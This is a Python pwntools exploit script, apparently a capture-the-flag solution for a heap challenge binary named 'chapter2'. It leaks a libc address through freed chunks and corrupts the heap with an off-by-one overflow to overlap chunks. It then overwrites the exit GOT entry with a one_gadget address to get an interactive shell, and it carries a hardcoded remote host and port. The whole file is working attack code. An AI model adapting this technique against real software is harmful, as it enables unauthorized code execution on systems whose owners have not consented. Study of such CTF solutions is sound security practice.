from pwn import * 

def allocate(size, data):
    global p 

    p.recvuntil(">> ")
    p.sendline("1")

    p.recvuntil("Size: ")
    p.sendline(str(size))
    
    p.recvuntil("Data: ")
    p.sendline(data)

def edit(index, data):

    global p 

    p.recvuntil(">> ")
    p.sendline("2")

    p.recvuntil("Index: ")
    p.sendline(str(index))

    p.recvuntil("Data: ")
    p.sendline(data)


def delete(index):

    global p 

    p.recvuntil(">> ")
    p.sendline("3")

    p.recvuntil("Index: ")
    p.sendline(str(index))

def dump(index):

    global p 

    p.recvuntil(">> ")
    p.sendline("4")

    p.recvuntil("Index: ")
    p.sendline(str(index))


def exit():

    global p 

    p.recvuntil(">> ")
    p.sendline("5")


def main():

    global p 
    HOST = "178.62.107.125" 
    PORT = 31148
    local = True
    libc = ELF("./libc_leaked.so")

    if local:

        p = process("./chapter2")

    else:

        p = remote(HOST, PORT)

    #stage one: leaking libc
    allocate(0x108, b'A' * 0x108)

    allocate(0x108, b'B' * 0x108)
    delete(1)
    delete(0)
    allocate(0x88, b'A' * 0x7)
    dump(0)
    p.recvline()
    libc_leak = p.recvline().rstrip().ljust(8, b'\x00')
    libc_leak = u64(libc_leak)
    log.info(f"Libc leak: {hex(libc_leak)}")
    libc_base = libc_leak - 0x3c4c78 
    log.info(f"Libc base: {hex(libc_base)}")
    libc.address = libc_base
    system = libc.sym['system']
    log.info(f"System : {hex(system)}")

    allocate(0x10, b'cat flag\x00') #1

    allocate(0x108, b'C' * 0x108) #2
    allocate(0x208, b'D' * 0x1f0 + p64(0x200)) #3
    allocate(0x108, b'E' * 0x108) #4

    allocate(0x108, b'F' * 0x108) #5 
    delete(3)
    edit(2, b'A' * 0x108)
    allocate(0x108, b'H' * 0x108)

    allocate(0x80, b'G' * 0x80)
    delete(3)
    delete(4)
    one_gadget = libc_base + 0xf1117
    exit_got = 0x602060
    log.info(f"one_gadget : {hex(one_gadget)}")

    allocate(0x140, b'Z' * 0x110 + p64(8) + p64(exit_got))
    edit(6, p64(one_gadget))
    
    exit()
    p.interactive()
    

if __name__ == "__main__":

    main()

